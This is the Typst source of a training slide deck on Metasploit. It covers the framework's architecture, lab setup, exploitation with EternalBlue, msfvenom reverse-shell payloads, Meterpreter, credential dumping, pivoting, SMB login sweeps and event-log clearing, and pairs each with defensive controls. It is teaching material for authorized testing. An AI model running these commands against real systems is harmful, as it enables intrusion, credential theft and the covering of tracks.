#import "../../../typst-theme-emberzero/1.1.0/src/lib.typ": *

#show: athena-theme.with(
  font: "Berkeley Mono",
  config-info(
    title: [Module 10: Metasploit],
    subtitle: [From First Module to Final Report],
    authors: [*Project Athena*],
    extra: [],
    footer: [Module 10 - Metasploit],
  ),
  config-common(
    handout: false,
  ),
)

#title-slide()

#slide(title: "Why Metasploit")[
  - Framework for developing, testing and running exploit code
  - Most widely used exploitation tool in penetration testing
  - Equally useful for blue teams: does the patch close the hole? does the
    IDS fire? does incident response detect a live session?

  #cblock(title: [Legal boundary], color: red.darken(20%))[
    Only your own lab, deliberately vulnerable targets, or a signed engagement
    with defined scope. Otherwise: StGB §118a. "I was only learning" is not a
    defence.
  ]
]

#section-slide(title: "Introduction")

#slide(title: "Why a Framework")[
  - Before: one script per vulnerability, with everything hard-coded
  - Metasploit separates the concerns into reusable modules:

  #table(
    columns: (auto, 1fr),
    inset: 6pt,
    stroke: 0.5pt + gray,
    [*Exploit*], [Delivers control],
    [*Payload*], [What runs once you have control],
    [*Encoder*], [Reshapes the payload],
    [*Handler*], [Waits for the payload to call back],
  )

  - *Framework* (free, open source, in Kali) is what we use; *Pro* is optional
]

#slide(title: "Architecture")[
  #split(
    [
      #image("../lectures/images/framework-layers.svg", width: 100%)
    ],
    [
      - *Interfaces:* `msfconsole`, `msfvenom`, RPC / API
      - *Core:* module loader, session manager, handlers
      - *Modules:* the attack code
      - *Rex:* low-level sockets, parsing, encoding
      - *Database:* optional PostgreSQL for hosts, services, creds, loot
    ],
  )
]

#slide(title: "Module Types")[
  #table(
    columns: (auto, 1fr),
    inset: 6pt,
    stroke: 0.5pt + gray,
    [*exploit*], [Takes advantage of a vulnerability to run a payload],
    [*payload*], [Code that runs on the target after success],
    [*auxiliary*], [Scanners, fuzzers, sniffers, login testers],
    [*post*], [Runs against a session you already have],
    [*encoder*], [Transforms a payload (not reliable evasion)],
    [*nop*], [No-operation padding],
  )

  Named by path: `exploit/windows/smb/ms17_010_eternalblue`
]

#slide(title: "Payloads: Single vs. Staged")[
  ```text
  windows/shell_reverse_tcp   single: whole shell in one block
  windows/shell/reverse_tcp   staged: small stager, then stage
  ```

  - *Singles* are self-contained but larger
  - *Staged* split a tiny stager from the full stage; fits cramped buffers
  - The underscore versus slash is easy to miss and changes behaviour

  Meterpreter is almost always delivered staged.
]

#slide(title: "Bind vs. Reverse Connections")[
  #split(
    [
      *Bind*
      - Listens on a port on the target
      - You connect inward
      - Fails behind firewall / NAT
    ],
    [
      *Reverse*
      - Target connects back to you
      - Outbound is usually allowed
      - `reverse_tcp` is the default
    ],
  )

  #cblock(title: [Defence])[
    *Egress filtering* restricts outbound connections and closes the gap that
    reverse payloads ride. It is routinely neglected.
  ]
]

#section-slide(title: "Installation and Configuration")

#slide(title: "Installing and Updating")[
  - On *Kali* it is preinstalled; keep it current:

  ```bash
  sudo apt update && sudo apt full-upgrade
  ```

  - Rapid7 publishes an installer for Debian / Ubuntu, macOS, Windows
  - On Windows, exclude the directory from Defender (lab machines only)

  #cblock(title: [Habit worth breaking])[
    Do not pipe a script from the internet straight into a shell. Download,
    read, then run.
  ]
]

#slide(title: "The Database")[
  - Optional, but it persists hosts, services, creds and loot
  - On Kali, one command wires up PostgreSQL:

  ```bash
  sudo msfdb init
  sudo msfdb status
  msfconsole      # then: db_status
  ```

  - `db_nmap -sV 10.10.10.0/24` stores scan results straight in
  - Query with `hosts`, `services`, `vulns`, `creds`, `loot`
]

#slide(title: "Workspaces and Globals")[
  #split(
    [
      *Workspaces* isolate each job
      ```text
      workspace
      workspace -a lab_internal
      workspace -d old_job
      ```
    ],
    [
      *Globals* save typing
      ```text
      setg LHOST 10.10.10.5
      setg RHOSTS 10.10.10.20
      unsetg LHOST
      ```
    ],
  )

  A stale global `RHOSTS` is a classic way to fire at the wrong host. Check
  `show options` before every run.
]

#slide(title: "Build an Isolated Lab")[
  ```text
  host-only network 10.10.10.0/24
  +------------------+        +----------------------+
  | Kali attacker    |        | Metasploitable       |
  | 10.10.10.5       |------->| 10.10.10.20          |
  | msfconsole, DB   |        | deliberately vuln.   |
  +------------------+        +----------------------+
       no route out to the internet or the real LAN
```

  A vulnerable VM exposed to the network is one someone else will compromise.
  The isolation is not optional.
]

#section-slide(title: "Basic Usage")

#slide(title: "The Standard Workflow")[
  Almost everything follows five steps:

  1. *search* for a module
  2. *use* it
  3. check and *set* its options
  4. *run* (or `exploit`) it
  5. work with the resulting *session*

  ```text
  search type:exploit platform:windows smb
  search cve:2017 type:exploit
  ```

  Results show a *rank*; prefer higher-ranked modules.
]

#slide(title: "Options and Payloads")[
  ```text
  use exploit/windows/smb/ms17_010_eternalblue
  show options
  set RHOSTS 10.10.10.20
  set LHOST 10.10.10.5
  show payloads
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  ```

  - *RHOSTS / RPORT:* the target; *LHOST / LPORT:* your handler
  - Read the options back after setting them
  - Wrong `LHOST` is the most common beginner mistake
]

#slide(title: "Staged Payloads and Handlers")[
  #split(
    [
      #image("../lectures/images/staged-payload.svg", width: 100%)
    ],
    [
      - The exploit carries only the small stager
      - Metasploit starts a *handler* on `LHOST:LPORT` automatically
      - The stage is delivered over the network and runs *in memory*:
        scanning files on disk will not find it
    ],
  )
]

#slide(title: "Handlers and msfvenom")[
  Catch a payload you delivered another way:

  ```text
  use exploit/multi/handler
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST 10.10.10.5
  exploit -j
  ```

  Generate a standalone payload file:

  ```bash
  msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=10.10.10.5 LPORT=4444 -f exe -o payload.exe
  ```
]

#slide(title: "Sessions and When Exploits Fail")[
  #split(
    [
      *Sessions*
      ```text
      sessions
      sessions -i 1
      sessions -k 1
      ```
      `background` keeps a session alive.
    ],
    [
      *Failure checklist*
      - Right `RHOSTS`, service up?
      - `LHOST` reachable?
      - Architecture match (x86/x64)?
      - Callback blocked?
      - Already patched? Try `check`
    ],
  )
]

#section-slide(title: "Advanced Usage")

#slide(title: "Meterpreter")[
  In-memory, encrypted post-exploitation agent; quieter than a raw shell.

  ```text
  sysinfo      getuid       getpid
  ps           pwd / ls     shell
  download <f> upload <f>   background
  migrate <pid>            # move to a stable process
  ```

  *Migrating* keeps the session alive and is harder to spot. The defensive
  counterpart is *process-lineage monitoring*: an EDR notices one process
  writing and executing another's memory.
]

#slide(title: "Post Modules")[
  Run a `post/` module against a session you have:

  ```text
  background
  use post/windows/gather/enum_logged_on_users
  set SESSION 1
  run
  ```

  - `post/multi/gather/*`: credentials, SSH keys, browser data
  - `post/windows/gather/*`: users, software, network config
  - `post/multi/manage/*`: autoroute, migrate

  Collected data lands in the `loot` and `creds` tables.
]

#slide(title: "Pivoting")[
  #align(center, image("../lectures/images/pivot-route.svg", width: 56%))

  Use a compromised host as a relay to reach a hidden network.
]

#slide(title: "Autoroute, portfwd, SOCKS")[
  ```text
  use post/multi/manage/autoroute
  set SESSION 1
  run
  portfwd add -l 3389 -p 3389 -r 10.10.0.20
  use auxiliary/server/socks_proxy
  run -j
  ```

  #cblock(title: [Defence is segmentation])[
    A perimeter firewall does nothing; the traffic is already inside.
    Internal segmentation plus east-west monitoring stops the pivot.
  ]
]

#slide(title: "A Realistic View of Evasion")[
  - *Encoders* (e.g. `shikata_ga_nai`) change bytes, originally to remove bad
    characters. Signature detection learned the common encoders long ago
  - *Format and template* choices change the wrapper, not the payload
  - Stock Metasploit output is among the most heavily signatured code there is

  Caught by memory scanning, behaviour monitoring, egress filtering and
  process-lineage analysis. *Use Metasploit to confirm your detections fire.*
]

#section-slide(title: "Post-Exploitation Techniques")

#slide(title: "The Phases")[
  A useful order once you have a session:

  1. Situational awareness: who and where am I?
  2. Privilege escalation
  3. Credential access
  4. Persistence (authorized tests only)
  5. Lateral movement
  6. Collection and exfiltration
  7. Cleanup and reporting

  Each is in scope only if the contract says so.
]

#slide(title: "Situational Awareness and Escalation")[
  ```text
  sysinfo    getuid    ipconfig    route    ps
  ```

  - The routing table shows what *other* networks this host can reach
  - The *local exploit suggester* lists candidate escalations:

  ```text
  use post/multi/recon/local_exploit_suggester
  set SESSION 1
  run
  ```

  Treat its output as candidates to verify. *Patch management* is the
  prevention.
]

#slide(title: "Credential Access")[
  ```text
  hashdump                          # needs SYSTEM
  use post/multi/gather/ssh_creds
  load kiwi
  creds_all
  ```

  - Credentials turn one host into many via reuse
  - Reading another process's memory (LSASS) is a strong EDR signal

  #cblock(title: [Defence is largely organisational])[
    No password reuse, least privilege, Credential Guard / LSASS protection,
    limited privileged logon.
  ]
]

#slide(title: "Persistence and Lateral Movement")[
  - *Persistence* (scheduled tasks, services, run keys, cron) must be
    authorized, scoped, documented, and removed in cleanup
  - It is among the most detectable things an attacker does: baselining
    autoruns catches it reliably

  ```text
  use auxiliary/scanner/smb/smb_login
  set RHOSTS 10.10.0.0/24
  set SMBUser Administrator
  run
  ```

  Lateral movement = one account logging in to many hosts: a SIEM signal.
]

#slide(title: "Loot, Anti-Forensics, Cleanup")[
  - Bulk outbound transfers are a DLP and egress-monitoring signal
  - `clearev` clears Windows event logs; a gap-filled log is itself an IoC

  #cblock(title: [Central logging defeats local tampering])[
    Ship logs to a SIEM in real time, so clearing the local copy achieves
    nothing.
  ]

  - Cleanup: remove persistence, delete tools, close sessions, `db_export`
  - *The report is the deliverable; the shells were only the means.*
]

#standout-slide(title: [Reverse payloads ride outbound traffic. The control is egress filtering.])
